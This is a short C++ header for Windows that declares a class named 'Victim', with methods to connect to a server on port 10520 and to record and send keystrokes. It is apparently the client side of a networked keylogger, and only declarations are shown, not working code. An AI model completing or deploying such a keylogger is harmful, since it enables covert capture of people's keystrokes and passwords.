#pragma once
#include <iostream>
#include <Winsock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <string>

#define ACTIVE_PROMISE_CODE -32767

const int CONNECTION_PORT = 10520;
const std::string DEFAULT_IP = "127.0.0.1";

class Victim {
private:
	WSADATA	_wsaData;
	sockaddr_in _addr;
	SOCKET _connection_socket;
	std::string _target_ip_addr;

public:
	Victim(const std::string& target_ip_addr = DEFAULT_IP);

	int connectToServer();
	void recordAndSendKeys();
};
